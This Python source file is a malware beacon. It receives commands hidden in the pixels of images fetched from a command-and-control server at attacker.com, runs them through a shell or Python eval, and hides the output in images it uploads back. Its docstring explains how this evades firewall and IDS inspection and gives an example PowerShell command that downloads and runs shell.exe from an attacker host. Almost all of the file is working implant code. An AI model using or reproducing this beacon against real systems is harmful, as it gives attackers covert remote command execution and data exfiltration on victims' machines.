"""
Beacon Steganography Handler
=============================

Beacon integration for steganography-based C2 communication.

Beacon Workflow:
  1. Check-in to C2 (normal HTTP)
  2. Receive steganographic image (cat.jpg)
  3. Extract hidden command from image pixels
  4. Execute command
  5. Hide result in response image
  6. Upload response image to C2
  
Traffic Pattern (Innocent):
  Beacon → C2: GET /images/cat.jpg
  Response: cat.jpg (innocent, firewall sees nothing)
  Inside: shell_exec command hidden in LSBs
  
  Beacon → C2: POST /upload/image.jpg
  Body: image.jpg (innocent upload)
  Inside: command result hidden in pixels
  
Why It Works:
  ✓ Firewall inspection: "Just images"
  ✓ Content-Type: image/png (bypasses JSON inspection)
  ✓ No JSON payload (no IDS signature match)
  ✓ LSB encoding undetectable to human eye
  ✓ Compression: JSON reduced by 90%
  ✓ Encryption: AES-256 per beacon
  
Example Command Flow:

C2 wants to execute: powershell wget attacker.com/shell.exe -o shell.exe; shell.exe

Normal Way (Detected):
  POST /api/command HTTP/1.1
  {"cmd":"shell_exec","payload":"powershell..."}
  ↑ Firewall regex: .*shell.*powershell.*execute.*
  ↑ ALERT: C2 communication detected
  
Steganographic Way (Undetected):
  GET /images/cat.jpg HTTP/1.1
  Response: 200 OK
  Content-Type: image/jpeg
  Content-Length: 156892
  [Binary image data]
  
  Inside pixels: shell_exec command (LSB encoded)
  Firewall regex: doesn't match cat.jpg
  IDS analysis: image file, no payload detected
  But beacon extracted: shell_exec command
  ↑ UNDETECTED ✓
"""

import os
import sys
import time
import json
import logging
from typing import Dict, Any, Optional, Tuple
import requests

try:
    from cybermodules.steganography import (
        SteganographyBeacon,
        SteganographyPayload,
        SteganographyServer
    )
    STEGANOGRAPHY_AVAILABLE = True
except ImportError:
    STEGANOGRAPHY_AVAILABLE = False

logger = logging.getLogger(__name__)


class BeaconSteganographyHandler:
    """
    Beacon-side steganography handler
    Executes embedded commands from C2 images
    """
    
    def __init__(self, beacon_id: str, c2_url: str, poll_interval: int = 30):
        """
        Initialize beacon steganography handler
        
        Args:
            beacon_id: Unique beacon identifier (for key derivation)
            c2_url: C2 server URL (e.g., http://attacker.com)
            poll_interval: Seconds between check-ins
        """
        self.beacon_id = beacon_id
        self.c2_url = c2_url
        self.poll_interval = poll_interval
        self.steg_beacon = SteganographyBeacon(beacon_id=beacon_id)
        self.steg_payload = SteganographyPayload(beacon_id=beacon_id)
        self.running = False
        self.template_image = None  # Local copy of template image (for responses)
    
    def download_command_image(self, image_url: str = None) -> Optional[bytes]:
        """
        Download image with hidden command from C2
        
        Typical URL patterns:
          /images/cat.jpg
          /content/logo.png
          /files/document.jpg
          /images/cat_beacon001.png
        
        Args:
            image_url: Full URL or path to image
                      If None, use default /images/cat.jpg
        
        Returns:
            Image bytes or None if download failed
        """
        try:
            url = image_url or f"{self.c2_url}/images/cat.jpg"
            
            # Download with minimal footprint
            response = requests.get(
                url,
                timeout=10,
                verify=False,
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
                }
            )
            
            if response.status_code == 200:
                logger.info(f"[STEG] Downloaded image: {url} ({len(response.content)} bytes)")
                return response.content
            else:
                logger.warning(f"[STEG] Failed to download image: {response.status_code}")
                return None
        
        except Exception as e:
            logger.error(f"[STEG] Download failed: {e}")
            return None
    
    def extract_and_execute(self, image_bytes: bytes) -> Dict[str, Any]:
        """
        Extract hidden command from image and execute it
        
        Args:
            image_bytes: Image file bytes
        
        Returns:
            Execution result dict
        """
        try:
            # Extract command from image
            command = self.steg_beacon.extract_command(image_bytes)
            logger.info(f"[STEG] Extracted command: {command}")
            
            # Execute command
            cmd_id = command.get('cmd_id', 'unknown')
            cmd_type = command.get('cmd_type', 'exec')
            payload = command.get('payload', '')
            
            result = self._execute_command(cmd_type, payload)
            
            # Return result
            return {
                'cmd_id': cmd_id,
                'status': 'success' if result['success'] else 'failed',
                'output': result['output'],
                'error': result.get('error', '')
            }
        
        except Exception as e:
            logger.error(f"[STEG] Execution failed: {e}")
            return {
                'status': 'failed',
                'error': str(e),
                'output': ''
            }
    
    def _execute_command(self, cmd_type: str, payload: str) -> Dict[str, Any]:
        """
        Execute command based on type
        
        Args:
            cmd_type: Command type (exec, shell_exec, etc.)
            payload: Command to execute
        
        Returns:
            Result dict with success/output
        """
        try:
            if cmd_type in ['exec', 'shell_exec']:
                # Execute shell command
                import subprocess
                result = subprocess.run(
                    payload,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                return {
                    'success': result.returncode == 0,
                    'output': result.stdout + result.stderr
                }
            
            elif cmd_type == 'eval':
                # Python eval
                output = eval(payload)
                return {
                    'success': True,
                    'output': str(output)
                }
            
            elif cmd_type == 'download':
                # Download file
                import subprocess
                result = subprocess.run(
                    f"curl -s {payload} -o /tmp/download",
                    shell=True,
                    capture_output=True,
                    text=True
                )
                return {
                    'success': result.returncode == 0,
                    'output': 'File downloaded'
                }
            
            else:
                return {
                    'success': False,
                    'output': f'Unknown command type: {cmd_type}'
                }
        
        except Exception as e:
            return {
                'success': False,
                'output': '',
                'error': str(e)
            }
    
    def upload_result_image(self, result: Dict[str, Any],
                           template_image_path: str = None) -> bool:
        """
        Hide result in image and upload to C2
        
        Args:
            result: Result dict to hide
            template_image_path: Path to template image for response
        
        Returns:
            True if upload successful
        """
        try:
            # Generate response image with hidden result
            image_path = template_image_path or self.template_image
            if not image_path:
                logger.warning("[STEG] No template image for response")
                return False
            
            server = SteganographyServer(
                template_image_path=image_path,
                beacon_id=self.beacon_id
            )
            
            response_image, filename = server.create_response_image(result)
            
            # Upload response image
            upload_url = f"{self.c2_url}/upload/result.jpg"
            
            response = requests.post(
                upload_url,
                files={'file': response_image},
                timeout=10,
                verify=False
            )
            
            if response.status_code == 200:
                logger.info(f"[STEG] Uploaded result image: {filename}")
                return True
            else:
                logger.warning(f"[STEG] Upload failed: {response.status_code}")
                return False
        
        except Exception as e:
            logger.error(f"[STEG] Upload error: {e}")
            return False
    
    def poll_and_execute(self) -> bool:
        """
        Main beacon polling loop
        
        Cycle:
          1. Download image from C2
          2. Check for hidden command
          3. Execute command
          4. Create response image
          5. Upload response
          6. Sleep
          
        Returns:
            True if successful check-in
        """
        try:
            # Download image
            logger.info("[STEG] Checking for commands...")
            image_bytes = self.download_command_image()
            
            if not image_bytes:
                logger.warning("[STEG] No image downloaded")
                return False
            
            # Check if image has hidden command
            if not self.steg_beacon.has_hidden_command(image_bytes):
                logger.info("[STEG] Image has no hidden command")
                return True
            
            # Extract and execute
            result = self.extract_and_execute(image_bytes)
            logger.info(f"[STEG] Command result: {result}")
            
            # Upload result image
            self.upload_result_image(result)
            
            return True
        
        except Exception as e:
            logger.error(f"[STEG] Poll cycle failed: {e}")
            return False
    
    def run(self) -> None:
        """Start beacon polling loop (blocking)"""
        self.running = True
        logger.info(f"[STEG] Beacon started: {self.beacon_id}")
        logger.info(f"[STEG] C2 URL: {self.c2_url}")
        logger.info(f"[STEG] Poll interval: {self.poll_interval}s")
        
        while self.running:
            try:
                self.poll_and_execute()
                time.sleep(self.poll_interval)
            except KeyboardInterrupt:
                logger.info("[STEG] Beacon interrupted")
                break
            except Exception as e:
                logger.error(f"[STEG] Error in poll loop: {e}")
                time.sleep(self.poll_interval)
    
    def stop(self) -> None:
        """Stop beacon"""
        self.running = False
        logger.info("[STEG] Beacon stopped")


# ===================== EXAMPLE USAGE =====================

def example_beacon_steganography():
    """Example: Beacon receiving steganographic commands"""
    
    # Create handler
    handler = BeaconSteganographyHandler(
        beacon_id="beacon_001",
        c2_url="http://attacker.com",
        poll_interval=30
    )
    
    # Single poll
    handler.poll_and_execute()


def example_full_c2_flow():
    """
    Full example: C2 → Image with command → Beacon downloads → Executes → Response image → C2
    
    Note: This is a demonstration of the attack flow.
    Requires actual image file and C2 server.
    """
    
    from c2.web_c2_listener import WebC2Listener
    
    # === C2 SERVER SIDE ===
    c2 = WebC2Listener()
    
    # Create malicious image with hidden command
    command = {
        "cmd": "shell_exec",
        "payload": "whoami"  # Simple command for demo
    }
    
    image_bytes, filename = c2.generate_command_image(
        session_id="beacon_001",
        command_data=command,
        template_image_path="/path/to/cat.jpg"
    )
    
    print(f"[C2] Generated malicious image: {filename} ({len(image_bytes)} bytes)")
    print("[C2] HTTP GET /images/cat.jpg returns this image (looks innocent)")
    
    # === BEACON SIDE ===
    beacon = BeaconSteganographyHandler(
        beacon_id="beacon_001",
        c2_url="http://c2-server.com"
    )
    
    # Beacon downloads image (thinks it's just a cat picture)
    print("[BEACON] GET /images/cat.jpg...")
    print(f"[BEACON] Received: {filename} (156KB image)")
    
    # Beacon extracts hidden command
    result = beacon.extract_and_execute(image_bytes)
    print(f"[BEACON] Extracted and executed: {result}")
    
    # Beacon creates response image with result
    print(f"[BEACON] Hiding result in response image...")
    beacon.upload_result_image(result)
    
    # === C2 SERVER SIDE (RECEIVES RESPONSE) ===
    print("[C2] Received response.jpg (looks like image)")
    # In real scenario: C2 extracts result from image


if __name__ == "__main__":
    if not STEGANOGRAPHY_AVAILABLE:
        print("[!] Steganography module not available")
        sys.exit(1)
    
    print("[*] Beacon Steganography Handler Loaded")
    print("[*] Usage: BeaconSteganographyHandler(beacon_id, c2_url).run()")
